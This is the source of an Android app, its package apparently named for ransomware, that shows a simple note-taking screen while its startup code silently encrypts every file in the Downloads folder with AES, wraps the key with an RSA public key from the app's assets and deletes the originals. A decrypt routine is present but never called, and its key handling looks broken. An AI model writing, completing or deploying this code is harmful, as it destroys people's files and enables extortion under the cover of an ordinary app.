
package com.example.myransmwoer

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.os.Environment
import android.util.Base64
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import java.io.File
import java.io.FileOutputStream
import java.io.InputStream
import java.security.KeyFactory
import java.security.PrivateKey
import java.security.PublicKey
import java.security.interfaces.RSAPrivateKey
import java.security.interfaces.RSAPublicKey
import javax.crypto.Cipher
import java.math.BigInteger
import com.example.myransmwoer.R
import java.security.spec.RSAPublicKeySpec
import java.security.spec.RSAPrivateKeySpec
import javax.crypto.KeyGenerator
import javax.crypto.SecretKey
import java.security.spec.X509EncodedKeySpec


class MainActivity : AppCompatActivity() {

    private lateinit var filePathEditText: EditText
    private lateinit var publicKey: RSAPublicKey
    private lateinit var privateKey: RSAPrivateKey

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // ضع هنا المفاتيح الفعالة الخاصة بك.
        publicKey = getPublicKey()
        privateKey = getPrivateKey()

        val saveButton: Button = findViewById(R.id.saveButton)
        val noteEditText: EditText = findViewById(R.id.noteEditText)

        saveButton.setOnClickListener {
            val note = noteEditText.text.toString()
            if (note.isNotEmpty()) {
                // هنا يمكن إضافة الكود لحفظ الملاحظة (مثل حفظها في قاعدة بيانات أو ملف)
                Toast.makeText(this, "تم حفظ الملاحظة!", Toast.LENGTH_SHORT).show()
            } else {
                Toast.makeText(this, "الرجاء إضافة ملاحظة", Toast.LENGTH_SHORT).show()
            }
        }


        encryptDownloadsFolder()

    }

    // التحقق من صلاحيات التخزين
    private fun checkPermissions(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
    }

    // طلب صلاحيات التخزين إذا كانت غير موجودة
    private fun requestPermissions() {
        ActivityCompat.requestPermissions(
            this,
            arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE),
            1
        )
    }

    // طريقة توليد المفتاح العام
    private fun getPublicKey(): RSAPublicKey {
        val keyFactory = KeyFactory.getInstance("RSA")
        val modulus = BigInteger("1234567890123456789012345678901234567890123456789012345678901234", 16) // مثال
        val exponent = BigInteger("010001", 16) // 65537 هو رقم قياسي في التشفير
        val publicKeySpec = RSAPublicKeySpec(modulus, exponent)
        return keyFactory.generatePublic(publicKeySpec) as RSAPublicKey
    }

    // طريقة توليد المفتاح الخاص
    private fun getPrivateKey(): RSAPrivateKey {
        val keyFactory = KeyFactory.getInstance("RSA")
        val modulus = BigInteger("1234567890123456789012345678901234567890123456789012345678901234", 16) // نفس المثال
        val exponent = BigInteger("010001", 16)
        val privateKeySpec = RSAPrivateKeySpec(modulus, BigInteger("6543210987654321", 16)) // مفتاح خاص مثال
        return keyFactory.generatePrivate(privateKeySpec) as RSAPrivateKey
    }

    private fun encryptDownloadsFolder() {
        // تحديد مسار مجلد التنزيلات
        val downloadsFolder = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).absolutePath)

        if (downloadsFolder.exists() && downloadsFolder.isDirectory) {
            try {
                Log.d("Encryption", "Downloads folder found: ${downloadsFolder.absolutePath}")
                // إنشاء مفتاح AES عشوائي للتشفير
                val aesKey = generateAESKey()

                // تصفح الملفات في مجلد التنزيلات
                downloadsFolder.listFiles()?.forEach { file ->
                    if (file.isFile) {
                        Log.d("Encryption", "File found: ${file.name}")

                        val fileUri = Uri.fromFile(file)
                        val fileData = readFile(fileUri)

                        Log.d("Encryption", "Original file size: ${fileData.size}")

                        // تشفير بيانات الملف باستخدام AES
                        val encryptedData = encryptDataWithAES(fileData, aesKey)

                        Log.d("Encryption", "Encrypted data size: ${encryptedData.size}")

                        // تشفير مفتاح AES باستخدام RSA
                        val encryptedAESKey = encryptAESKeyWithRSA(this, aesKey)

                        // حفظ الملفات المشفرة
                        saveToFile(encryptedData, "${file.name}.enc")
                        saveToFile(encryptedAESKey, "${file.name}_key.enc")

                        // حذف الملف الأصلي بعد التشفير
                        val deleted = file.delete()
                        if (deleted) {
                            Log.d("Encryption", "Original file deleted: ${file.name}")
                        } else {
                            Log.e("Encryption", "Failed to delete file: ${file.name}")
                        }
                    }
                }

                Toast.makeText(this, "Files Encrypted and Original Files Deleted Successfully!", Toast.LENGTH_SHORT).show()
            } catch (e: Exception) {
                Log.e("Encryption", "Error: ${e.message}")
            }
        }
    }

    private fun readFile(uri: Uri): ByteArray {
        val inputStream: InputStream = contentResolver.openInputStream(uri) ?: throw Exception("File not found")
        return inputStream.readBytes()
    }

    private fun generateAESKey(): SecretKey {
        val keyGenerator = KeyGenerator.getInstance("AES")
        keyGenerator.init(256)  // استخدام 256 بت
        return keyGenerator.generateKey()
    }

    private fun encryptDataWithAES(data: ByteArray, key: SecretKey): ByteArray {
        val cipher = Cipher.getInstance("AES")
        cipher.init(Cipher.ENCRYPT_MODE, key)
        return cipher.doFinal(data)
    }

    private fun encryptAESKeyWithRSA(context: Context, aesKey: SecretKey): ByteArray {
        try {
            val publicKey = loadRSAPublicKey(context)

            val cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding")
            cipher.init(Cipher.ENCRYPT_MODE, publicKey)

            return cipher.doFinal(aesKey.encoded)
        } catch (e: Exception) {
            e.printStackTrace()
            throw RuntimeException("Failed to encrypt AES key with RSA: ${e.message}")
        }
    }

    private fun loadRSAPublicKey(context: Context): PublicKey {
        return try {
            val inputStream = context.assets.open("public_key.pem")
            val publicKeyPEM = inputStream.bufferedReader().use { it.readText() }
            inputStream.close()

            val publicKeyPEMFormatted = publicKeyPEM
                .replace("-----BEGIN PUBLIC KEY-----", "")
                .replace("-----END PUBLIC KEY-----", "")
                .replace("\\s".toRegex(), "")

            val keyBytes = Base64.decode(publicKeyPEMFormatted, Base64.DEFAULT)
            val keySpec = X509EncodedKeySpec(keyBytes)
            val keyFactory = KeyFactory.getInstance("RSA")
            keyFactory.generatePublic(keySpec)
        } catch (e: Exception) {
            throw Exception("Failed to load RSA public key: ${e.message}", e)
        }
    }

    private fun saveToFile(data: ByteArray, fileName: String) {
        try {
            val downloadsFolder = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).absolutePath)
            val newFile = File(downloadsFolder, fileName)

            val outputStream = FileOutputStream(newFile)
            outputStream.write(data)
            outputStream.close()
        } catch (e: Exception) {
            Toast.makeText(this, "File Save Failed: ${e.message}", Toast.LENGTH_SHORT).show()
            Log.e("Encryption", "Error saving file: ${e.message}")
        }
    }
    private fun decryptDownloadsFolder() {
        val downloadsFolder = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).absolutePath)

        if (downloadsFolder.exists() && downloadsFolder.isDirectory) {
            try {
                downloadsFolder.listFiles()?.forEach { file ->
                    if (file.isFile && file.name.endsWith(".enc")) {
                        // أولاً: فك تشفير مفتاح AES باستخدام المفتاح الخاص RSA
                        val aesKey = decryptAESKeyWithRSA(this, file)

                        // ثانيًا: فك تشفير البيانات باستخدام مفتاح AES
                        val encryptedData = readFile(Uri.fromFile(file))
                        val decryptedData = decryptDataWithAES(encryptedData, aesKey)

                        // حفظ البيانات المفكوكة في ملف جديد
                        saveToFile(decryptedData, file.name.removeSuffix(".enc"))

                        // حذف الملف المشفر بعد فك التشفير
                        file.delete()
                    }
                }

                Toast.makeText(this, "Files Decrypted Successfully!", Toast.LENGTH_SHORT).show()
            } catch (e: Exception) {
                Toast.makeText(this, "Decryption Failed: ${e.message}", Toast.LENGTH_SHORT).show()
            }
        } else {
            Toast.makeText(this, "Downloads folder not found", Toast.LENGTH_SHORT).show()
        }
    }

    // دالة لفك تشفير مفتاح AES باستخدام RSA
    private fun decryptAESKeyWithRSA(context: Context, encryptedAESKeyFile: File): SecretKey {
        try {
            val encryptedAESKey = readFile(Uri.fromFile(encryptedAESKeyFile))
            val cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding")
            cipher.init(Cipher.DECRYPT_MODE, privateKey)
            val decryptedAESKey = cipher.doFinal(encryptedAESKey)
            return javax.crypto.spec.SecretKeySpec(decryptedAESKey, "AES")
        } catch (e: Exception) {
            throw RuntimeException("Failed to decrypt AES key with RSA: ${e.message}")
        }
    }

    // دالة لفك تشفير البيانات باستخدام AES
    private fun decryptDataWithAES(data: ByteArray, key: SecretKey): ByteArray {
        val cipher = Cipher.getInstance("AES")
        cipher.init(Cipher.DECRYPT_MODE, key)
        return cipher.doFinal(data)
    }



}